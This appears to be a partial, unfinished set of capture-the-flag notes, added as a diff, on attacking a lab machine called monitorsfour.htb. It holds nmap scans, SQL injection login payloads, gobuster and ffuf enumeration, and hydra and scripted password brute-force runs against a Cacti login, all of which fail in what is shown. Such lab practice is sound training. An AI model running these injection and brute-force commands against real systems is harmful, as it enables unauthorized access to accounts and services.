@@ -1,0 +1,934 @@
+sudo nmap -sS -p- 10.10.11.98 --verbose -T3
+
+sudo nmap -sU --top-ports 1000 10.10.11.98
+
+sudo nmap -sS -p- 10.10.11.98 --verbose -T4
+[sudo] password for hsungus:
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-11 22:17 -0300
+Initiating Ping Scan at 22:17
+Scanning 10.10.11.98 [4 ports]
+Completed Ping Scan at 22:17, 0.23s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 22:17
+Completed Parallel DNS resolution of 1 host. at 22:17, 0.50s elapsed
+Initiating SYN Stealth Scan at 22:17
+Scanning 10.10.11.98 [65535 ports]
+Discovered open port 80/tcp on 10.10.11.98
+SYN Stealth Scan Timing: About 4.67% done; ETC: 22:28 (0:10:33 remaining)
+SYN Stealth Scan Timing: About 13.36% done; ETC: 22:25 (0:06:36 remaining)
+SYN Stealth Scan Timing: About 25.96% done; ETC: 22:26 (0:06:02 remaining)
+SYN Stealth Scan Timing: About 35.68% done; ETC: 22:25 (0:04:43 remaining)
+SYN Stealth Scan Timing: About 44.69% done; ETC: 22:24 (0:03:51 remaining)
+SYN Stealth Scan Timing: About 52.95% done; ETC: 22:25 (0:03:29 remaining)
+SYN Stealth Scan Timing: About 62.36% done; ETC: 22:25 (0:02:40 remaining)
+Discovered open port 5985/tcp on 10.10.11.98
+SYN Stealth Scan Timing: About 77.18% done; ETC: 22:24 (0:01:27 remaining)
+SYN Stealth Scan Timing: About 84.27% done; ETC: 22:24 (0:01:01 remaining)
+Completed SYN Stealth Scan at 22:23, 352.61s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.98
+Host is up (0.21s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+80/tcp   open  http
+5985/tcp open  wsman
+
+
+➜  ~ curl -L http://10.10.11.98
+curl: (6) Could not resolve host: monitorsfour.htb
+
+➜  ~ echo "10.10.11.98 monitorsfour.htb" | sudo tee -a /etc/hosts
+10.10.11.98 monitorsfour.htb
+
+
+with the curl
+saw this line:
+
+  <link rel="shortcut icon" type="image/x-icon" href="/static/admin/assets/images/logo.ico">
+
+also:
+    <div class="row">
+        <div class="col-lg-7">
+          <div class="owl-carousel owl-loaded owl-drag">
+            <div class="review-item">
+              <div class="review-details"><i class="fas fa-quote-left"></i> MonitorsFour completely transformed our network infrastructure. Their team was professional, knowledgeable, and responsive to our needs. Highly recommend their services!</div>
+              <div class="review-author">
+                <span class="review-name">Nicola Johnson</span>
+                <span class="review-desig">(IT Manager, TechCorp)</span>
+              </div>
+            </div>
+            <div class="review-item">
+              <div class="review-details"><i class="fas fa-quote-left"></i> We were facing frequent network outages before switching to MonitorsFour. Their network monitoring service has been a game changer for our business operations.</div>
+              <div class="review-author">
+                <span class="review-name">Glenn Jones</span>
+                <span class="review-desig">(CEO, BizSolutions)</span>
+
+
+and:
+            <a class="nav-link learn-more-btn" href="/login">Login</a>
+
+
+that reveal: path to admin, internal users, and explicitly login page;
+
+so, first, i did:
+curl -L http://monitorsfour.htb/login >> loginCurl.txt
+
+Discovered that its username and password, then tried several sql injetctions:
+
+➜  MonitorsFlow git:(main) ✗ curl -v -X POST http://monitorsfour.htb/api/v1/auth \
+     -d "username=admin' OR 1=1--" \
+     -d "password=anything"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host monitorsfour.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.98
+*   Trying 10.10.11.98:80...
+* Established connection to monitorsfour.htb (10.10.11.98 port 80) from 10.10.14.250 port 57726
+* using HTTP/1.x
+> POST /api/v1/auth HTTP/1.1
+> Host: monitorsfour.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Content-Length: 42
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 42 bytes
+< HTTP/1.1 302 Found
+< Server: nginx
+< Date: Fri, 12 Dec 2025 02:10:10 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< X-Powered-By: PHP/8.3.27
+< Set-Cookie: PHPSESSID=d546e386d0e809b7e3cd13aec39ff856; path=/
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Location: /login
+<
+* Connection #0 to host monitorsfour.htb:80 left intact
+➜  MonitorsFlow git:(main) ✗ curl -v -X POST http://monitorsfour.htb/login \
+     -d "username=admin' OR 1=1--" \
+     -d "password=anything"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host monitorsfour.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.98
+*   Trying 10.10.11.98:80...
+* Established connection to monitorsfour.htb (10.10.11.98 port 80) from 10.10.14.250 port 47820
+* using HTTP/1.x
+> POST /login HTTP/1.1
+> Host: monitorsfour.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Content-Length: 42
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 42 bytes
+< HTTP/1.1 405 Method Not Allowed
+< Server: nginx
+< Date: Fri, 12 Dec 2025 02:12:08 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< X-Powered-By: PHP/8.3.27
+< Set-Cookie: PHPSESSID=38d9839804790331739a10054ab77cb0; path=/
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+* Connection #0 to host monitorsfour.htb:80 left intact
+➜  MonitorsFlow git:(main) ✗ curl -v -X POST http://monitorsfour.htb/api/v1/auth \
+     -d "username=admin' OR 1=1-- -" \
+     -d "password=anything"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host monitorsfour.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.98
+*   Trying 10.10.11.98:80...
+* Established connection to monitorsfour.htb (10.10.11.98 port 80) from 10.10.14.250 port 48662
+* using HTTP/1.x
+> POST /api/v1/auth HTTP/1.1
+> Host: monitorsfour.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Content-Length: 44
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 44 bytes
+< HTTP/1.1 302 Found
+< Server: nginx
+< Date: Fri, 12 Dec 2025 02:15:17 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< X-Powered-By: PHP/8.3.27
+< Set-Cookie: PHPSESSID=3db9124483eb47355c429f60fe8b8e96; path=/
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Location: /login
+<
+* Connection #0 to host monitorsfour.htb:80 left intact
+➜  MonitorsFlow git:(main) ✗ curl -v -X POST http://monitorsfour.htb/api/v1/auth \
+     -d "username=admin' OR 1=1;%23" \
+     -d "password=anything"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host monitorsfour.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.98
+*   Trying 10.10.11.98:80...
+* Established connection to monitorsfour.htb (10.10.11.98 port 80) from 10.10.14.250 port 54182
+* using HTTP/1.x
+> POST /api/v1/auth HTTP/1.1
+> Host: monitorsfour.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Content-Length: 44
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 44 bytes
+< HTTP/1.1 302 Found
+< Server: nginx
+< Date: Fri, 12 Dec 2025 02:15:58 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< X-Powered-By: PHP/8.3.27
+< Set-Cookie: PHPSESSID=8494bf4e4b51b0c29afaee7a21d25f26; path=/
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Location: /login
+<
+* Connection #0 to host monitorsfour.htb:80 left intact
+➜  MonitorsFlow git:(main) ✗ curl -v -X POST http://monitorsfour.htb/api/v1/auth \
+     -d "username=nicola' OR 1=1-- -" \
+     -d "password=anything"
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host monitorsfour.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.98
+*   Trying 10.10.11.98:80...
+* Established connection to monitorsfour.htb (10.10.11.98 port 80) from 10.10.14.250 port 54244
+* using HTTP/1.x
+> POST /api/v1/auth HTTP/1.1
+> Host: monitorsfour.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Content-Length: 45
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 45 bytes
+< HTTP/1.1 302 Found
+< Server: nginx
+< Date: Fri, 12 Dec 2025 02:16:11 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< X-Powered-By: PHP/8.3.27
+< Set-Cookie: PHPSESSID=1929a9096e89e70603a666d8a9759707; path=/
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Location: /login
+<
+* Connection #0 to host monitorsfour.htb:80 left intact
+*
+*
+
+
+none was sucessfull
+
+ran
+gobuster vhost -u http://monitorsfour.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+
+to try and discover subdomains
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://monitorsfour.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+cacti.monitorsfour.htb Status: 302 [Size: 0] [--> /cacti]
+Progress: 4989 / 4989 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+discovering cacti
+
+so, did it again for cacti
+
+➜  MonitorsFlow git:(main) ✗ gobuster vhost -u http://cacti.monitorsfour.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://cacti.monitorsfour.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Progress: 4989 / 4989 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+so, no subdomains for cacti.
+curl -L http://cacti.monitorsfour.htb >> cacticurl.txt
+
+where i found the version of login is 1.2.28, so its new. So no sql injections.
+
+ran hydra with guesses:
+
+➜  MonitorsFlow git:(main) ✗ hydra -L cactiUsers.txt -P cactiPass.txt cacti.monitorsfour.htb http-post-form "/cacti/index.php:action=login&login_username=^USER^&login_password=^PASS^:Invalid User Name/Password"
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-12 00:14:50
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 42 login tries (l:6/p:7), ~3 tries per task
+[DATA] attacking http-post-form://cacti.monitorsfour.htb:80/cacti/index.php:action=login&login_username=^USER^&login_password=^PASS^:Invalid User Name/Password
+[80][http-post-form] host: cacti.monitorsfour.htb   login: nicola   password: password
+[80][http-post-form] host: cacti.monitorsfour.htb   login: admin   password: MonitorsFour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: nicola   password: welcome
+[80][http-post-form] host: cacti.monitorsfour.htb   login: admin   password: MonitorsFour!
+[80][http-post-form] host: cacti.monitorsfour.htb   login: admin   password: admin
+[80][http-post-form] host: cacti.monitorsfour.htb   login: nicola   password: admin
+[80][http-post-form] host: cacti.monitorsfour.htb   login: nicola   password: MonitorsFour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: admin   password: password
+[80][http-post-form] host: cacti.monitorsfour.htb   login: nicola   password: monitorsfour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: njohnson   password: password
+[80][http-post-form] host: cacti.monitorsfour.htb   login: admin   password: welcome
+[80][http-post-form] host: cacti.monitorsfour.htb   login: admin   password: welcome1
+[80][http-post-form] host: cacti.monitorsfour.htb   login: njohnson   password: admin
+[80][http-post-form] host: cacti.monitorsfour.htb   login: nicola   password: welcome1
+[80][http-post-form] host: cacti.monitorsfour.htb   login: nicola   password: MonitorsFour!
+[80][http-post-form] host: cacti.monitorsfour.htb   login: admin   password: monitorsfour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: njohnson   password: monitorsfour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: njohnson   password: MonitorsFour!
+[80][http-post-form] host: cacti.monitorsfour.htb   login: njohnson   password: MonitorsFour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: njohnson   password: welcome
+[80][http-post-form] host: cacti.monitorsfour.htb   login: njohnson   password: welcome1
+[80][http-post-form] host: cacti.monitorsfour.htb   login: glenn   password: admin
+[80][http-post-form] host: cacti.monitorsfour.htb   login: glenn   password: MonitorsFour!
+[80][http-post-form] host: cacti.monitorsfour.htb   login: glenn   password: MonitorsFour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: glenn   password: password
+[80][http-post-form] host: cacti.monitorsfour.htb   login: glenn   password: monitorsfour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: gjones   password: password
+[80][http-post-form] host: cacti.monitorsfour.htb   login: gjones   password: admin
+[80][http-post-form] host: cacti.monitorsfour.htb   login: glenn   password: welcome
+[80][http-post-form] host: cacti.monitorsfour.htb   login: glenn   password: welcome1
+[80][http-post-form] host: cacti.monitorsfour.htb   login: gjones   password: monitorsfour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: gjones   password: MonitorsFour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: gjones   password: MonitorsFour!
+[80][http-post-form] host: cacti.monitorsfour.htb   login: gjones   password: welcome1
+[80][http-post-form] host: cacti.monitorsfour.htb   login: gjones   password: welcome
+[80][http-post-form] host: cacti.monitorsfour.htb   login: guest   password: admin
+[80][http-post-form] host: cacti.monitorsfour.htb   login: guest   password: monitorsfour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: guest   password: MonitorsFour
+[80][http-post-form] host: cacti.monitorsfour.htb   login: guest   password: password
+[80][http-post-form] host: cacti.monitorsfour.htb   login: guest   password: welcome
+[80][http-post-form] host: cacti.monitorsfour.htb   login: guest   password: MonitorsFour!
+[80][http-post-form] host: cacti.monitorsfour.htb   login: guest   password: welcome1
+1 of 1 target successfully completed, 42 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-12 00:14:58
+
+but its not workin due to CSRF tokens;
+
+so, i copied a code for this kind of exploit from metasploit, and adaptated it,
+
+➜  MonitorsFlow git:(main) ✗ python3 bruteCacti.py
+[*] Starting attack against http://cacti.monitorsfour.htb/cacti/index.php...
+[-] Failed: admin:admin
+[-] Failed: admin:password
+[-] Failed: admin:monitorsfour
+[-] Failed: admin:MonitorsFour!
+[-] Failed: admin:welcome
+[-] Failed: admin:welcome1
+[-] Failed: admin:123456
+[-] Failed: nicola:admin
+[-] Failed: nicola:password
+[-] Failed: nicola:monitorsfour
+[-] Failed: nicola:MonitorsFour!
+[-] Failed: nicola:welcome
+[-] Failed: nicola:welcome1
+[-] Failed: nicola:123456
+[-] Failed: glenn:admin
+[-] Failed: glenn:password
+[-] Failed: glenn:monitorsfour
+[-] Failed: glenn:MonitorsFour!
+[-] Failed: glenn:welcome
+[-] Failed: glenn:welcome1
+[-] Failed: glenn:123456
+[-] Failed: guest:admin
+[-] Failed: guest:password
+[-] Failed: guest:monitorsfour
+[-] Failed: guest:MonitorsFour!
+[-] Failed: guest:welcome
+[-] Failed: guest:welcome1
+[-] Failed: guest:123456
+
+[*] Attack finished.
+
+none of it worked.
+
+I expanded the list with more guesses:
+
+➜  MonitorsFlow git:(main) ✗ python3 bruteCacti.py
+[*] Starting attack against http://cacti.monitorsfour.htb/cacti/index.php...
+[-] Failed: admin:admin
+[-] Failed: admin:password
+[-] Failed: admin:monitorsfour
+[-] Failed: admin:MonitorsFour
+[-] Failed: admin:MonitorsFour!
+[-] Failed: admin:MonitorsFour123
+[-] Failed: admin:MonitorsFour2025
+[-] Failed: admin:MonitorsFour2024
+[-] Failed: admin:MonitorsFour!
+[-] Failed: admin:welcome
+[-] Failed: admin:welcome1
+[-] Failed: admin:Welcome1!
+[-] Failed: admin:nicola
+[-] Failed: admin:glenn
+[-] Failed: guest:admin
+[-] Failed: guest:password
+[-] Failed: guest:monitorsfour
+[-] Failed: guest:MonitorsFour
+[-] Failed: guest:MonitorsFour!
+[-] Failed: guest:MonitorsFour123
+[-] Failed: guest:MonitorsFour2025
+[-] Failed: guest:MonitorsFour2024
+[-] Failed: guest:MonitorsFour!
+[-] Failed: guest:welcome
+[-] Failed: guest:welcome1
+[-] Failed: guest:Welcome1!
+[-] Failed: guest:nicola
+[-] Failed: guest:glenn
+[-] Failed: nicola:admin
+[-] Failed: nicola:password
+[-] Failed: nicola:monitorsfour
+[-] Failed: nicola:MonitorsFour
+[-] Failed: nicola:MonitorsFour!
+[-] Failed: nicola:MonitorsFour123
+[-] Failed: nicola:MonitorsFour2025
+[-] Failed: nicola:MonitorsFour2024
+[-] Failed: nicola:MonitorsFour!
+[-] Failed: nicola:welcome
+[-] Failed: nicola:welcome1
+[-] Failed: nicola:Welcome1!
+[-] Failed: nicola:nicola
+[-] Failed: nicola:glenn
+[-] Failed: njohnson:admin
+[-] Failed: njohnson:password
+[-] Failed: njohnson:monitorsfour
+[-] Failed: njohnson:MonitorsFour
+[-] Failed: njohnson:MonitorsFour!
+[-] Failed: njohnson:MonitorsFour123
+[-] Failed: njohnson:MonitorsFour2025
+[-] Failed: njohnson:MonitorsFour2024
+[-] Failed: njohnson:MonitorsFour!
+[-] Failed: njohnson:welcome
+[-] Failed: njohnson:welcome1
+[-] Failed: njohnson:Welcome1!
+[-] Failed: njohnson:nicola
+[-] Failed: njohnson:glenn
+[-] Failed: nicola.johnson:admin
+[-] Failed: nicola.johnson:password
+[-] Failed: nicola.johnson:monitorsfour
+[-] Failed: nicola.johnson:MonitorsFour
+[-] Failed: nicola.johnson:MonitorsFour!
+[-] Failed: nicola.johnson:MonitorsFour123
+[-] Failed: nicola.johnson:MonitorsFour2025
+[-] Failed: nicola.johnson:MonitorsFour2024
+[-] Failed: nicola.johnson:MonitorsFour!
+[-] Failed: nicola.johnson:welcome
+[-] Failed: nicola.johnson:welcome1
+[-] Failed: nicola.johnson:Welcome1!
+[-] Failed: nicola.johnson:nicola
+[-] Failed: nicola.johnson:glenn
+[-] Failed: n.johnson:admin
+[-] Failed: n.johnson:password
+[-] Failed: n.johnson:monitorsfour
+[-] Failed: n.johnson:MonitorsFour
+[-] Failed: n.johnson:MonitorsFour!
+[-] Failed: n.johnson:MonitorsFour123
+[-] Failed: n.johnson:MonitorsFour2025
+[-] Failed: n.johnson:MonitorsFour2024
+[-] Failed: n.johnson:MonitorsFour!
+[-] Failed: n.johnson:welcome
+[-] Failed: n.johnson:welcome1
+[-] Failed: n.johnson:Welcome1!
+[-] Failed: n.johnson:nicola
+[-] Failed: n.johnson:glenn
+[-] Failed: johnson.n:admin
+[-] Failed: johnson.n:password
+[-] Failed: johnson.n:monitorsfour
+[-] Failed: johnson.n:MonitorsFour
+[-] Failed: johnson.n:MonitorsFour!
+[-] Failed: johnson.n:MonitorsFour123
+[-] Failed: johnson.n:MonitorsFour2025
+[-] Failed: johnson.n:MonitorsFour2024
+[-] Failed: johnson.n:MonitorsFour!
+[-] Failed: johnson.n:welcome
+[-] Failed: johnson.n:welcome1
+[-] Failed: johnson.n:Welcome1!
+[-] Failed: johnson.n:nicola
+[-] Failed: johnson.n:glenn
+[-] Failed: glenn:admin
+[-] Failed: glenn:password
+[-] Failed: glenn:monitorsfour
+[-] Failed: glenn:MonitorsFour
+[-] Failed: glenn:MonitorsFour!
+[-] Failed: glenn:MonitorsFour123
+[-] Failed: glenn:MonitorsFour2025
+[-] Failed: glenn:MonitorsFour2024
+[-] Failed: glenn:MonitorsFour!
+[-] Failed: glenn:welcome
+[-] Failed: glenn:welcome1
+[-] Failed: glenn:Welcome1!
+[-] Failed: glenn:nicola
+[-] Failed: glenn:glenn
+[-] Failed: gjones:admin
+[-] Failed: gjones:password
+[-] Failed: gjones:monitorsfour
+[-] Failed: gjones:MonitorsFour
+[-] Failed: gjones:MonitorsFour!
+[-] Failed: gjones:MonitorsFour123
+[-] Failed: gjones:MonitorsFour2025
+[-] Failed: gjones:MonitorsFour2024
+[-] Failed: gjones:MonitorsFour!
+[-] Failed: gjones:welcome
+[-] Failed: gjones:welcome1
+[-] Failed: gjones:Welcome1!
+[-] Failed: gjones:nicola
+[-] Failed: gjones:glenn
+[-] Failed: glenn.jones:admin
+[-] Failed: glenn.jones:password
+[-] Failed: glenn.jones:monitorsfour
+[-] Failed: glenn.jones:MonitorsFour
+[-] Failed: glenn.jones:MonitorsFour!
+[-] Failed: glenn.jones:MonitorsFour123
+[-] Failed: glenn.jones:MonitorsFour2025
+[-] Failed: glenn.jones:MonitorsFour2024
+[-] Failed: glenn.jones:MonitorsFour!
+[-] Failed: glenn.jones:welcome
+[-] Failed: glenn.jones:welcome1
+[-] Failed: glenn.jones:Welcome1!
+[-] Failed: glenn.jones:nicola
+[-] Failed: glenn.jones:glenn
+[-] Failed: g.jones:admin
+[-] Failed: g.jones:password
+[-] Failed: g.jones:monitorsfour
+[-] Failed: g.jones:MonitorsFour
+[-] Failed: g.jones:MonitorsFour!
+[-] Failed: g.jones:MonitorsFour123
+[-] Failed: g.jones:MonitorsFour2025
+[-] Failed: g.jones:MonitorsFour2024
+[-] Failed: g.jones:MonitorsFour!
+[-] Failed: g.jones:welcome
+[-] Failed: g.jones:welcome1
+[-] Failed: g.jones:Welcome1!
+[-] Failed: g.jones:nicola
+[-] Failed: g.jones:glenn
+[-] Failed: jones.g:admin
+[-] Failed: jones.g:password
+[-] Failed: jones.g:monitorsfour
+[-] Failed: jones.g:MonitorsFour
+[-] Failed: jones.g:MonitorsFour!
+[-] Failed: jones.g:MonitorsFour123
+[-] Failed: jones.g:MonitorsFour2025
+[-] Failed: jones.g:MonitorsFour2024
+[-] Failed: jones.g:MonitorsFour!
+[-] Failed: jones.g:welcome
+[-] Failed: jones.g:welcome1
+[-] Failed: jones.g:Welcome1!
+[-] Failed: jones.g:nicola
+[-] Failed: jones.g:glenn
+
+[*] Attack finished.
+
+none of which worked
+
+so, i decided to check the forgot-password;
+
+curl -L http://monitorsfour.htb/forgot-password >> forgotPassCurl.txt
+
+which made me realise, that forgot password resets a given password (exploitable), but i dont know the email formats;
+
+ sales@monitorsfour.htb
+
+BUT i checked first curl andd found this email;
+
+tried guessing it,
+➜  MonitorsFlow git:(main) ✗ python bruteCactiV2.py
+[*] Starting IMPROVED attack against http://cacti.monitorsfour.htb/cacti/index.php...
+
+[*] Attack finished. If no hits, we need to rethink.
+
+➜  MonitorsFlow git:(main) ✗ hydra -L salesAttack.txt -P salesPasswords.txt monitorsfour.htb http-post-form "/api/v1/auth:username=^USER^&password=^PASS^:F=/login"
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-12 00:41:26
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:5/p:10), ~4 tries per task
+[DATA] attacking http-post-form://monitorsfour.htb:80/api/v1/auth:username=^USER^&password=^PASS^:F=/login
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-12 00:41:31
+
+or sql injecting
+
+➜  MonitorsFlow git:(main) ✗ curl -v -X POST http://monitorsfour.htb/api/v1/reset -d "email=sales@monitorsfour.htb' OR 1=1-- -"
+Note: Unnecessary use of -X or --request, POST is already
+Note: inferred.
+* Host monitorsfour.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.98
+*   Trying 10.10.11.98:80...
+* Established connection to monitorsfour.htb (10.10.11.98 port 80) from 10.10.14.250 port 36078
+* using HTTP/1.x
+> POST /api/v1/reset HTTP/1.1
+> Host: monitorsfour.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Content-Length: 40
+> Content-Type: application/x-www-form-urlencoded
+>
+* upload completely sent off: 40 bytes
+< HTTP/1.1 302 Found
+< Server: nginx
+< Date: Fri, 12 Dec 2025 03:37:08 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< X-Powered-By: PHP/8.3.27
+< Set-Cookie: PHPSESSID=81efd45160d8986623006aad2f5bc90b; path=/
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Location: /forgot-password
+<
+* Connection #0 to host monitorsfour.htb:80 left intact
+
+but nothing worked
+
+then i tried enumerating paramenters...
+
+gobuster vhost -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+
+and
+./ffuf -u 'http://monitorsfour.htb/index.php?FUZZ=test_value' \
+       -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+       -fs 0
+
+and
+
+gobuster dir -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
+
+
+
+ffuf found nothing:
+
+➜  ~ gobuster vhost -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://monitorsfour.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+cacti.monitorsfour.htb Status: 302 [Size: 0] [--> /cacti]
+#www.monitorsfour.htb Status: 400 [Size: 150]
+#mail.monitorsfour.htb Status: 400 [Size: 150]
+#smtp.monitorsfour.htb Status: 400 [Size: 150]
+#pop3.monitorsfour.htb Status: 400 [Size: 150]
+Progress: 114442 / 114442 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+subdomains found more subdomains; so all curled them all
+➜  MonitorsFlow git:(main) ✗ curl -L http://\#www.monitorsfour.htb >> wwwcurl.txt
+curl: (3) URL rejected: No host part in the URL
+➜  MonitorsFlow git:(main) ✗ curl -L http://#www.monitorsfour.htb >> wwwcurl.txt
+curl: (3) URL rejected: No host part in the URL
+➜  MonitorsFlow git:(main) ✗ curl -L http://#mail.monitorsfour.htb >> mailcurl.txt
+curl: (3) URL rejected: No host part in the URL
+➜  MonitorsFlow git:(main) ✗ curl -L http://#smtp.monitorsfour.htb >> smtpcurl.txt
+curl: (3) URL rejected: No host part in the URL
+➜  MonitorsFlow git:(main) ✗ curl -L http://#pop3.monitorsfour.htb >> pop3curl.txt
+curl: (3) URL rejected: No host part in the URL
+
+but they led to nothing
+
+then i looked into the directory scan (not complete)
+
+➜  ~ gobuster dir -u http://monitorsfour.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://monitorsfour.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+contact              (Status: 200) [Size: 367]
+login                (Status: 200) [Size: 4340]
+user                 (Status: 200) [Size: 35]
+static               (Status: 301) [Size: 162] [--> http://monitorsfour.htb/static/]
+views                (Status: 301) [Size: 162] [--> http://monitorsfour.htb/views/]
+Progress: 18737 / 661674 (2.83%)[ERROR] error on word interests: timeout occurred during the request
+[ERROR] error on word interests.php: timeout occurred during the request
+[ERROR] error on word interests.txt: timeout occurred during the request
+forgot-password      (Status: 200) [Size: 3099]
+Router.php           (Status: 200) [Size: 0]
+controllers          (Status: 301) [Size: 162] [--> http://monitorsfour.htb/controllers/]
+
+and tried curling them:
+
+of which i found:
+
+➜  MonitorsFlow git:(main) ✗ curl -L http://monitorsfour.htb/user
+{"error":"Missing token parameter"}%
+
+also run:
+
+(venv) ➜  dirsearch git:(master) ✗ python dirsearch.py -u http://monitorsfour.htb -x 404
